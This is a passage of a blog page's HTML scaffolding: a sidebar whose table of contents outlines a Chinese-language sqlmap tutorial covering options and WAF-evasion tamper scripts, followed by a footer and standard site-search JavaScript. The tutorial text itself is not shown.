    </script>
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            Overview
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/avatar.png"
               alt="empty_xl" />
          <p class="site-author-name" itemprop="name">empty_xl</p>
           
              <p class="site-description motion-element" itemprop="description">Hacked By_ EmPTy_xL../ security blog </p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives/">
                <span class="site-state-item-count">57</span>
                <span class="site-state-item-name">posts</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">17</span>
                <span class="site-state-item-name">categories</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">69</span>
                <span class="site-state-item-name">tags</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/emptyxl" target="_blank" title="Github">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                    
                      Github
                    
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="/mail/index.html" target="_blank" title="E-Mail">
                  
                    <i class="fa fa-fw fa-envelope"></i>
                  
                    
                      E-Mail
                    
                </a>
              </span>
            
          
        </div>

        
        
          <div class="cc-license motion-element" itemprop="license">
            <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" class="cc-opacity" target="_blank">
              <img src="/images/cc-by-nc-nd.svg" alt="Creative Commons" />
            </a>
          </div>
        

        
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#参数介绍"><span class="nav-number">1.</span> <span class="nav-text">参数介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#target-目标"><span class="nav-number">1.1.</span> <span class="nav-text">target/目标</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#目标URL"><span class="nav-number">1.1.1.</span> <span class="nav-text">目标URL</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Burp或者WebScarab代理中获取日志"><span class="nav-number">1.1.2.</span> <span class="nav-text">Burp或者WebScarab代理中获取日志</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#文本中获取多个目标扫描"><span class="nav-number">1.1.3.</span> <span class="nav-text">文本中获取多个目标扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#文件中加载HTTP请求"><span class="nav-number">1.1.4.</span> <span class="nav-text">文件中加载HTTP请求</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#处理google搜索结果"><span class="nav-number">1.1.5.</span> <span class="nav-text">处理google搜索结果</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#根据配置文件处理"><span class="nav-number">1.1.6.</span> <span class="nav-text">根据配置文件处理</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Request-请求"><span class="nav-number">1.2.</span> <span class="nav-text">Request/请求</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#http方法"><span class="nav-number">1.2.1.</span> <span class="nav-text">http方法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#http数据"><span class="nav-number">1.2.2.</span> <span class="nav-text">http数据</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参数拆分字符"><span class="nav-number">1.2.3.</span> <span class="nav-text">参数拆分字符</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#HTTP-cookie头"><span class="nav-number">1.2.4.</span> <span class="nav-text">HTTP cookie头</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#HTTP-User-Agent头"><span class="nav-number">1.2.5.</span> <span class="nav-text">HTTP User-Agent头</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#HTTP-Referer头"><span class="nav-number">1.2.6.</span> <span class="nav-text">HTTP Referer头</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#额外的HTTP头"><span class="nav-number">1.2.7.</span> <span class="nav-text">额外的HTTP头</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#HTTP请求延迟"><span class="nav-number">1.2.8.</span> <span class="nav-text">HTTP请求延迟</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#设定超时时间"><span class="nav-number">1.2.9.</span> <span class="nav-text">设定超时时间</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#利用正则过滤目标网址"><span class="nav-number">1.2.10.</span> <span class="nav-text">利用正则过滤目标网址</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#避免过多的错误请求被屏蔽"><span class="nav-number">1.2.11.</span> <span class="nav-text">避免过多的错误请求被屏蔽</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#每次请求时候执行自定义的python代码"><span class="nav-number">1.2.12.</span> <span class="nav-text">每次请求时候执行自定义的python代码</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Injection-注入"><span class="nav-number">1.3.</span> <span class="nav-text">Injection/注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#测试参数"><span class="nav-number">1.3.1.</span> <span class="nav-text">测试参数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#指定数据库"><span class="nav-number">1.3.2.</span> <span class="nav-text">指定数据库</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#指定数据库服务器系统"><span class="nav-number">1.3.3.</span> <span class="nav-text">指定数据库服务器系统</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#指定无效的大数字"><span class="nav-number">1.3.4.</span> <span class="nav-text">指定无效的大数字</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#指定无效的逻辑"><span class="nav-number">1.3.5.</span> <span class="nav-text">指定无效的逻辑</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#注入payload"><span class="nav-number">1.3.6.</span> <span class="nav-text">注入payload</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#修改注入的数据"><span class="nav-number">1.3.7.</span> <span class="nav-text">修改注入的数据</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Detection-探测"><span class="nav-number">1.4.</span> <span class="nav-text">Detection/探测</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#探测等级"><span class="nav-number">1.4.1.</span> <span class="nav-text">探测等级</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#风险等级"><span class="nav-number">1.4.2.</span> <span class="nav-text">风险等级</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#页面比较"><span class="nav-number">1.4.3.</span> <span class="nav-text">页面比较</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#注入技术"><span class="nav-number">1.5.</span> <span class="nav-text">注入技术</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#测试是否是注入"><span class="nav-number">1.5.1.</span> <span class="nav-text">测试是否是注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#设定延迟注入的时间"><span class="nav-number">1.5.2.</span> <span class="nav-text">设定延迟注入的时间</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#设定UNION查询字段数"><span class="nav-number">1.5.3.</span> <span class="nav-text">设定UNION查询字段数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#设定UNION查询使用的字符"><span class="nav-number">1.5.4.</span> <span class="nav-text">设定UNION查询使用的字符</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#二阶SQL注入"><span class="nav-number">1.5.5.</span> <span class="nav-text">二阶SQL注入</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#枚举数据"><span class="nav-number">1.6.</span> <span class="nav-text">枚举数据</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#标志"><span class="nav-number">1.6.1.</span> <span class="nav-text">标志</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#用户"><span class="nav-number">1.6.2.</span> <span class="nav-text">用户</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#当前数据库"><span class="nav-number">1.6.3.</span> <span class="nav-text">当前数据库</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#列数据库管理用户"><span class="nav-number">1.6.4.</span> <span class="nav-text">列数据库管理用户</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#列出并破解数据库用户的hash"><span class="nav-number">1.6.5.</span> <span class="nav-text">列出并破解数据库用户的hash</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#列出数据库管理员权限"><span class="nav-number">1.6.6.</span> <span class="nav-text">列出数据库管理员权限</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#列举数据库表"><span class="nav-number">1.6.7.</span> <span class="nav-text">列举数据库表</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#列举数据库表中的字段"><span class="nav-number">1.6.8.</span> <span class="nav-text">列举数据库表中的字段</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#列举数据库系统的架构"><span class="nav-number">1.6.9.</span> <span class="nav-text">列举数据库系统的架构</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#获取表中数据个数"><span class="nav-number">1.6.10.</span> <span class="nav-text">获取表中数据个数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#获取整个表的数据"><span class="nav-number">1.6.11.</span> <span class="nav-text">获取整个表的数据</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#运行自定义的SQL语句"><span class="nav-number">1.6.12.</span> <span class="nav-text">运行自定义的SQL语句</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#暴力破解"><span class="nav-number">1.7.</span> <span class="nav-text">暴力破解</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#暴力破解表名"><span class="nav-number">1.7.1.</span> <span class="nav-text">暴力破解表名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#暴力破解列名"><span class="nav-number">1.7.2.</span> <span class="nav-text">暴力破解列名</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#系统文件操作"><span class="nav-number">1.8.</span> <span class="nav-text">系统文件操作</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#从数据库服务器中读取文件"><span class="nav-number">1.8.1.</span> <span class="nav-text">从数据库服务器中读取文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#把文件上传到数据库服务器中"><span class="nav-number">1.8.2.</span> <span class="nav-text">把文件上传到数据库服务器中</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#运行任意操作系统命令"><span class="nav-number">1.8.3.</span> <span class="nav-text">运行任意操作系统命令</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#对Windows注册表操作"><span class="nav-number">1.9.</span> <span class="nav-text">对Windows注册表操作</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#读取注册表值"><span class="nav-number">1.9.1.</span> <span class="nav-text">读取注册表值</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#写入注册表值"><span class="nav-number">1.9.2.</span> <span class="nav-text">写入注册表值</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#删除注册表值"><span class="nav-number">1.9.3.</span> <span class="nav-text">删除注册表值</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#常规参数"><span class="nav-number">1.10.</span> <span class="nav-text">常规参数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#从sqlite中读取session"><span class="nav-number">1.10.1.</span> <span class="nav-text">从sqlite中读取session</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#保存HTTP-S-日志"><span class="nav-number">1.10.2.</span> <span class="nav-text">保存HTTP(S)日志</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#非交互模式"><span class="nav-number">1.10.3.</span> <span class="nav-text">非交互模式</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#强制使用字符编码"><span class="nav-number">1.10.4.</span> <span class="nav-text">强制使用字符编码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#爬行网站URL"><span class="nav-number">1.10.5.</span> <span class="nav-text">爬行网站URL</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#规定输出到CSV中的分隔符"><span class="nav-number">1.10.6.</span> <span class="nav-text">规定输出到CSV中的分隔符</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#其他参数"><span class="nav-number">1.11.</span> <span class="nav-text">其他参数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#使用HTTP参数污染"><span class="nav-number">1.11.1.</span> <span class="nav-text">使用HTTP参数污染</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#测试WAF-IPS-IDS保护"><span class="nav-number">1.11.2.</span> <span class="nav-text">测试WAF/IPS/IDS保护</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#自带tamper分析"><span class="nav-number">2.</span> <span class="nav-text">自带tamper分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#单引号替换-apostrophemask-py"><span class="nav-number">2.1.</span> <span class="nav-text">单引号替换 apostrophemask.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#单引号替换-apostrophenullencode-py"><span class="nav-number">2.2.</span> <span class="nav-text">单引号替换 apostrophenullencode.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#添加空字符-appendnullbyte-py"><span class="nav-number">2.3.</span> <span class="nav-text">添加空字符 appendnullbyte.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#base64编码-base64encode-py"><span class="nav-number">2.4.</span> <span class="nav-text">base64编码 base64encode.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#比较符替换-between-py"><span class="nav-number">2.5.</span> <span class="nav-text">比较符替换 between.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#空格替换-bluecoat-py"><span class="nav-number">2.6.</span> <span class="nav-text">空格替换 bluecoat.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#两次urlencode-chardoubleencode-py"><span class="nav-number">2.7.</span> <span class="nav-text">两次urlencode chardoubleencode.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#一次url编码-charencode-py"><span class="nav-number">2.8.</span> <span class="nav-text">一次url编码 charencode.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unicode转义-charunicodeencode-py"><span class="nav-number">2.9.</span> <span class="nav-text">unicode转义 charunicodeencode.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unicode转义-charunicodeescape-py"><span class="nav-number">2.10.</span> <span class="nav-text">unicode转义 charunicodeescape.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#逗号替换-commalesslimit-py"><span class="nav-number">2.11.</span> <span class="nav-text">逗号替换 commalesslimit.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mid函数逗号替换-commalessmid-py"><span class="nav-number">2.12.</span> <span class="nav-text">mid函数逗号替换 commalessmid.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#括号前注释-commentbeforeparentheses-py"><span class="nav-number">2.13.</span> <span class="nav-text">括号前注释 commentbeforeparentheses.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#concat替换-concat2concatws-py"><span class="nav-number">2.14.</span> <span class="nav-text">concat替换 concat2concatws.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#等号替换成like-equaltolike-py"><span class="nav-number">2.15.</span> <span class="nav-text">等号替换成like equaltolike.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#引号转义逃逸-escapequotes-py"><span class="nav-number">2.16.</span> <span class="nav-text">引号转义逃逸 escapequotes.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#大于号替换-greatest-py"><span class="nav-number">2.17.</span> <span class="nav-text">大于号替换 greatest.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#在关键词前加内联注释-halfversionedmorekeywords-py"><span class="nav-number">2.18.</span> <span class="nav-text">在关键词前加内联注释 halfversionedmorekeywords.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#html实体转义-htmlencode-py"><span class="nav-number">2.19.</span> <span class="nav-text">html实体转义 htmlencode.py</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ifnull函数替换-ifnull2casewhenisnull-py"><span class="nav-number">2.19.1.</span> <span class="nav-text">ifnull函数替换 ifnull2casewhenisnull.py</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ifnull函数替换-ifnull2ifisnull-py"><span class="nav-number">2.20.</span> <span class="nav-text">ifnull函数替换 ifnull2ifisnull.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#内置表过滤绕过-informationschemacomment-py"><span class="nav-number">2.21.</span> <span class="nav-text">内置表过滤绕过 informationschemacomment.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用least替换比较符-least-py"><span class="nav-number">2.22.</span> <span class="nav-text">使用least替换比较符 least.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#大写转小写-lowercase-py"><span class="nav-number">2.23.</span> <span class="nav-text">大写转小写 lowercase.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#完整语句注释绕过-modsecurityversioned-py"><span class="nav-number">2.24.</span> <span class="nav-text">完整语句注释绕过 modsecurityversioned.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#完整语句注释绕过-modsecurityzeroversioned-py"><span class="nav-number">2.25.</span> <span class="nav-text">完整语句注释绕过 modsecurityzeroversioned.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#关键字周围加空格-multiplespaces-py"><span class="nav-number">2.26.</span> <span class="nav-text">关键字周围加空格 multiplespaces.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#叠写关键字-nonrecursivereplacement-py"><span class="nav-number">2.27.</span> <span class="nav-text">叠写关键字 nonrecursivereplacement.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#overlongutf8-py"><span class="nav-number">2.28.</span> <span class="nav-text">overlongutf8.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#用百分号加到所有字符前面-percentage-py"><span class="nav-number">2.29.</span> <span class="nav-text">用百分号加到所有字符前面 percentage.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#加号替换为concat-plus2concat-py"><span class="nav-number">2.30.</span> <span class="nav-text">加号替换为concat plus2concat.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#加号替换为fn-concat-plus2fnconcat-py"><span class="nav-number">2.31.</span> <span class="nav-text">加号替换为fn concat plus2fnconcat.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#随机大小写-randomcase-py"><span class="nav-number">2.32.</span> <span class="nav-text">随机大小写 randomcase.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#随机加注释-randomcomments-py"><span class="nav-number">2.33.</span> <span class="nav-text">随机加注释 randomcomments.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#加入任意字符串-securesphere-py"><span class="nav-number">2.34.</span> <span class="nav-text">加入任意字符串 securesphere.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#添加sp-password字段-sp-password-py"><span class="nav-number">2.35.</span> <span class="nav-text">添加sp_password字段 sp_password.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#空格替换-space2comment-py"><span class="nav-number">2.36.</span> <span class="nav-text">空格替换 space2comment.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#空格替换-space2dash-py"><span class="nav-number">2.37.</span> <span class="nav-text">空格替换 space2dash.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#空格替换-space2hash-py"><span class="nav-number">2.38.</span> <span class="nav-text">空格替换 space2hash.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#空格替换-space2morecomment-py"><span class="nav-number">2.39.</span> <span class="nav-text">空格替换 space2morecomment.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#空格替换-space2morehash-py"><span class="nav-number">2.40.</span> <span class="nav-text">空格替换 space2morehash.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#空格替换-space2mssqlblank-py"><span class="nav-number">2.41.</span> <span class="nav-text">空格替换 space2mssqlblank.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#空格替换-space2plus-py"><span class="nav-number">2.42.</span> <span class="nav-text">空格替换 space2plus.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#空格替换-space2randomblank-py"><span class="nav-number">2.43.</span> <span class="nav-text">空格替换 space2randomblank.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#逻辑操作符替换-symboliclogical-py"><span class="nav-number">2.44.</span> <span class="nav-text">逻辑操作符替换 symboliclogical.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#union替换-unionalltounion-py"><span class="nav-number">2.45.</span> <span class="nav-text">union替换 unionalltounion.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#宽字符注入-unmagicquotes-py"><span class="nav-number">2.46.</span> <span class="nav-text">宽字符注入 unmagicquotes.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#大写-uppercase-py"><span class="nav-number">2.47.</span> <span class="nav-text">大写 uppercase.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HTTP头部注入-varnish-py"><span class="nav-number">2.48.</span> <span class="nav-text">HTTP头部注入 varnish.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#关键字内联注释-versionedmorekeywords-py"><span class="nav-number">2.49.</span> <span class="nav-text">关键字内联注释 versionedmorekeywords.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HTTP头部注入-xforwardedfor-py"><span class="nav-number">2.50.</span> <span class="nav-text">HTTP头部注入 xforwardedfor.py</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    
    &emsp;&emsp;|&emsp;
  </span>
  <span class="author" itemprop="copyrightHolder">empty_xl</span>
</div>


<div class="powered-by">
  
  Power &mdash; Hexo
</div>

<div class="theme-info">
  
  Theme &mdash; NexT.Mist
</div>
<div>
</div>


        

        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>



  


  




	





  





  






  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
